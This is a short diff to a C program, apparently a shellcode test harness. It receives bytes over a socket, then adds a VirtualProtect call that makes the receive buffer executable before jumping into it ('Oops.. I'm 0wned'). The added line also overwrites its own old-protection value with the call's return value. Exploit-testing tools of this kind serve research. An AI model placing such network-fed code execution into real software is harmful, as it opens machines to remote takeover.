@@ -37,6 +37,7 @@ int ehlo, from;
 /* Main function */
 
 int main(int argc, char **argv) {
+	DWORD old;
 	struct 			sockaddr_in sin;
 	char 			buf[8092], *ptr;
 	int 			c, i, len, port;
@@ -100,9 +101,15 @@ int main(int argc, char **argv) {
 
 	printf("recv'd %d\n", bytes);
 
+	old = VirtualProtect(
+		buf,
+		sizeof(buf),
+		PAGE_EXECUTE_READWRITE,
+		&old);
+
 
 	/* Run the code */
-	fprintf(stderr,"Oops.. I'm 0wned.\n");
+	fprintf(stderr,"Oops.. I'm 0wned, reprotect success: %lu.\n", old);
 
 	__asm mov edi, new_s
 
